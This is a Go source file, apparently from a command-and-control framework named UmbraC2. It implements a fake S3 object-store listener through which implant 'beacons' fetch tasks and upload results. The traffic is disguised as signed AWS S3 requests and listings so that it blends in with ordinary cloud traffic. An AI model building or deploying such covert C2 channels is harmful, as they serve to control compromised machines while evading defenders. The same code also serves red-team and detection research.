package link

import (
	"context"
	"crypto/subtle"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/thesyntax1/UmbraC2/server/internal/crypt"
)

// The object transport.
//
// The beacon reads its work from one bucket and writes its results into
// another, the way a program that talks to an object store does.  The
// requests carry an AWS Signature Version 4 header, so the very same beacon
// can talk to a real S3 endpoint, and the server verifies the signature of
// every request before it looks at the body.
//
// The buckets of the transport are:
//
//	tasks    the work of the agents, written by the server
//	results  what the agents answer, written by the beacons
//
// The access key of a request is the id of the agent and the secret key is
// derived from the team key, so a key that leaks opens one mailbox only.

// S3Server is the object store of the transport.
type S3Server struct {
	Srv           *Server
	PSK           []byte
	Region        string
	TasksBucket   string
	ResultsBucket string

	mu      sync.Mutex
	objects map[string]map[string][]byte

	srv *http.Server
	ln  net.Listener
}

// MaxObjectBytes is the size of one object.
const MaxObjectBytes = 16 << 20

// NewS3Server creates the object store.
func NewS3Server(s *Server, psk []byte, region string) *S3Server {
	if region == "" {
		region = "us-east-1"
	}
	return &S3Server{
		Srv:           s,
		PSK:           psk,
		Region:        region,
		TasksBucket:   "umbra-tasks",
		ResultsBucket: "umbra-results",
		objects:       make(map[string]map[string][]byte),
	}
}

// Start binds the listener of the object store.
func (s *S3Server) Start(ctx context.Context, addr string) error {
	if addr == "" {
		return nil
	}
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("s3 listen %s: %w", addr, err)
	}
	s.ln = ln
	s.srv = &http.Server{
		Handler:           s,
		ReadHeaderTimeout: 15 * time.Second,
		ReadTimeout:       60 * time.Second,
		WriteTimeout:      60 * time.Second,
		IdleTimeout:       90 * time.Second,
		MaxHeaderBytes:    16 << 10,
	}
	s.Srv.Log.Info("object transport listening", "addr", addr,
		"tasks_bucket", s.TasksBucket, "results_bucket", s.ResultsBucket)
	go func() {
		if err := s.srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			s.Srv.Log.Error("the object transport stopped", "err", err)
		}
	}()
	go func() {
		<-ctx.Done()
		shutdown, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		_ = s.srv.Shutdown(shutdown)
	}()
	return nil
}

// Close stops the object store.
func (s *S3Server) Close() {
	if s.srv == nil {
		return
	}
	_ = s.srv.Close()
}

// put stores an object.
func (s *S3Server) put(bucket, key string, body []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()
	b, ok := s.objects[bucket]
	if !ok {
		b = make(map[string][]byte)
		s.objects[bucket] = b
	}
	b[key] = body
}

// get returns an object.
func (s *S3Server) get(bucket, key string) ([]byte, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	b, ok := s.objects[bucket]
	if !ok {
		return nil, false
	}
	body, ok := b[key]
	return body, ok
}

// remove deletes an object.
func (s *S3Server) remove(bucket, key string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if b, ok := s.objects[bucket]; ok {
		delete(b, key)
	}
}

// list returns the keys of a bucket, sorted.
func (s *S3Server) list(bucket string) []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	b, ok := s.objects[bucket]
	if !ok {
		return nil
	}
	keys := make([]string, 0, len(b))
	for k := range b {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	return keys
}

// ServeHTTP is the object store endpoint.
func (s *S3Server) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, MaxObjectBytes+1))
	if err != nil {
		http.Error(w, "the body could not be read", http.StatusBadRequest)
		return
	}
	if len(body) > MaxObjectBytes {
		http.Error(w, "the object is too large", http.StatusRequestEntityTooLarge)
		return
	}
	agent, err := s.verify(r, body)
	if err != nil {
		s.Srv.Log.Warn("the object request was refused", "err", err)
		http.Error(w, err.Error(), http.StatusForbidden)
		return
	}
	bucket, key := splitObjectPath(r.URL.Path)
	switch r.Method {
	case http.MethodPut:
		if bucket != s.ResultsBucket {
			http.Error(w, "the bucket is not writable", http.StatusForbidden)
			return
		}
		answer, err := s.Srv.HandleBatch(agent, "s3", body)
		if err != nil {
			http.Error(w, "the batch was refused", http.StatusBadRequest)
			return
		}
		if len(answer) > 0 {
			// The server has work for the agent: it waits in the task
			// bucket until the agent picks it up.
			s.put(s.TasksBucket, agent, answer)
		} else {
			// The batch was an answer: the work is done and the object
			// is gone, so the next check-in is not answered with the
			// same task.
			s.remove(s.TasksBucket, agent)
		}
		w.Header().Set("ETag", `"`+hex.EncodeToString(crypt.SHA256(body))+`"`)
		w.WriteHeader(http.StatusOK)
	case http.MethodGet:
		if key == "" {
			s.writeListing(w, bucket)
			return
		}
		if bucket != s.TasksBucket {
			http.Error(w, "the bucket is not readable", http.StatusForbidden)
			return
		}
		object, ok := s.get(bucket, key)
		if !ok {
			http.Error(w, "no such key", http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("ETag", `"`+hex.EncodeToString(crypt.SHA256(object))+`"`)
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write(object)
	case http.MethodHead:
		if key == "" {
			w.WriteHeader(http.StatusOK)
			return
		}
		object, ok := s.get(bucket, key)
		if !ok {
			w.WriteHeader(http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Length", strconv.Itoa(len(object)))
		w.WriteHeader(http.StatusOK)
	default:
		http.Error(w, "the method is not allowed", http.StatusMethodNotAllowed)
	}
}

// writeListing answers a listing of a bucket.
//
// The shape is the one of a real S3: the same XML, the same names, so a
// tool that reads a bucket reads this one as well.
func (s *S3Server) writeListing(w http.ResponseWriter, bucket string) {
	keys := s.list(bucket)
	var b strings.Builder
	b.WriteString("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
	b.WriteString("<ListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\">\n")
	fmt.Fprintf(&b, "  <Name>%s</Name>\n", bucket)
	fmt.Fprintf(&b, "  <KeyCount>%d</KeyCount>\n", len(keys))
	b.WriteString("  <MaxKeys>1000</MaxKeys>\n")
	b.WriteString("  <IsTruncated>false</IsTruncated>\n")
	for _, key := range keys {
		object, _ := s.get(bucket, key)
		b.WriteString("  <Contents>\n")
		fmt.Fprintf(&b, "    <Key>%s</Key>\n", key)
		fmt.Fprintf(&b, "    <Size>%d</Size>\n", len(object))
		fmt.Fprintf(&b, "    <ETag>&quot;%s&quot;</ETag>\n", hex.EncodeToString(crypt.SHA256(object)))
		b.WriteString("    <LastModified>2024-01-01T00:00:00.000Z</LastModified>\n")
		b.WriteString("  </Contents>\n")
	}
	b.WriteString("</ListBucketResult>\n")
	w.Header().Set("Content-Type", "application/xml")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write([]byte(b.String()))
}

// splitObjectPath cuts "/bucket/key" into its two parts.
func splitObjectPath(path string) (string, string) {
	trimmed := strings.TrimPrefix(path, "/")
	if trimmed == "" {
		return "", ""
	}
	bucket, key, found := strings.Cut(trimmed, "/")
	if !found {
		return bucket, ""
	}
	return bucket, key
}

// verify checks the AWS Signature Version 4 header of a request.
//
// The signature is recomputed from the request itself, so a body that was
// changed on the way, a date that was replayed or a path that was edited
// all fail the check.
func (s *S3Server) verify(r *http.Request, body []byte) (string, error) {
	auth := r.Header.Get("Authorization")
	if !strings.HasPrefix(auth, "AWS4-HMAC-SHA256 ") {
		return "", errors.New("the request carries no signature")
	}
	fields := map[string]string{}
	for _, part := range strings.Split(strings.TrimPrefix(auth, "AWS4-HMAC-SHA256 "), ",") {
		part = strings.TrimSpace(part)
		if key, value, found := strings.Cut(part, "="); found {
			fields[key] = value
		}
	}
	credential := fields["Credential"]
	signed := fields["SignedHeaders"]
	signature := fields["Signature"]
	if credential == "" || signed == "" || signature == "" {
		return "", errors.New("the signature is incomplete")
	}
	parts := strings.Split(credential, "/")
	if len(parts) != 5 {
		return "", errors.New("the credential is malformed")
	}
	agent, date, region, service, terminator := parts[0], parts[1], parts[2], parts[3], parts[4]
	if service != "s3" || terminator != "aws4_request" {
		return "", errors.New("the credential scope is not s3")
	}
	if region != s.Region {
		return "", errors.New("the region of the request does not match")
	}
	if agent == "" {
		return "", errors.New("the request has no access key")
	}
	amzDate := r.Header.Get("x-amz-date")
	if amzDate == "" {
		return "", errors.New("the request has no date")
	}
	if !strings.HasPrefix(amzDate, date) {
		return "", errors.New("the date of the request does not match the scope")
	}
	payloadHash := r.Header.Get("x-amz-content-sha256")
	if payloadHash == "" {
		return "", errors.New("the request has no payload hash")
	}
	if !strings.EqualFold(payloadHash, hex.EncodeToString(crypt.SHA256(body))) {
		return "", errors.New("the body does not match the hash of the request")
	}
	headerNames := strings.Split(signed, ";")
	canonical := canonicalRequest(r, headerNames, payloadHash)
	scope := strings.Join([]string{date, region, service, terminator}, "/")
	stringToSign := strings.Join([]string{
		"AWS4-HMAC-SHA256",
		amzDate,
		scope,
		hex.EncodeToString(crypt.SHA256([]byte(canonical))),
	}, "\n")
	key := signingKey(agentSecret(s.PSK, agent), date, region, service)
	want := hex.EncodeToString(crypt.HMACSHA256(key, []byte(stringToSign)))
	if subtle.ConstantTimeCompare([]byte(want), []byte(signature)) != 1 {
		return "", errors.New("the signature does not match the request")
	}
	return agent, nil
}

// canonicalRequest builds the request the way the signature is computed
// over it.
func canonicalRequest(r *http.Request, signed []string, payloadHash string) string {
	var b strings.Builder
	b.WriteString(r.Method)
	b.WriteString("\n")
	b.WriteString(r.URL.EscapedPath())
	b.WriteString("\n")
	b.WriteString(canonicalQuery(r.URL.Query()))
	b.WriteString("\n")
	b.WriteString(canonicalHeaders(r, signed))
	b.WriteString("\n")
	b.WriteString(strings.Join(signed, ";"))
	b.WriteString("\n")
	b.WriteString(payloadHash)
	return b.String()
}

// canonicalHeaders builds the signed headers of a request.
func canonicalHeaders(r *http.Request, signed []string) string {
	var b strings.Builder
	for _, name := range signed {
		value := ""
		if name == "host" {
			value = r.Host
		} else {
			value = strings.Join(r.Header.Values(http.CanonicalHeaderKey(name)), ",")
		}
		b.WriteString(name)
		b.WriteString(":")
		b.WriteString(strings.TrimSpace(value))
		b.WriteString("\n")
	}
	return b.String()
}

// canonicalQuery builds the query string of a request.
func canonicalQuery(values url.Values) string {
	keys := make([]string, 0, len(values))
	for key := range values {
		keys = append(keys, key)
	}
	sort.Strings(keys)
	parts := make([]string, 0, len(values))
	for _, key := range keys {
		items := append([]string(nil), values[key]...)
		sort.Strings(items)
		for _, item := range items {
			parts = append(parts, url.QueryEscape(key)+"="+url.QueryEscape(item))
		}
	}
	return strings.Join(parts, "&")
}

// signingKey derives the key the signature is computed with.
func signingKey(secret, date, region, service string) []byte {
	kDate := crypt.HMACSHA256([]byte("AWS4"+secret), []byte(date))
	kRegion := crypt.HMACSHA256(kDate, []byte(region))
	kService := crypt.HMACSHA256(kRegion, []byte(service))
	return crypt.HMACSHA256(kService, []byte("aws4_request"))
}
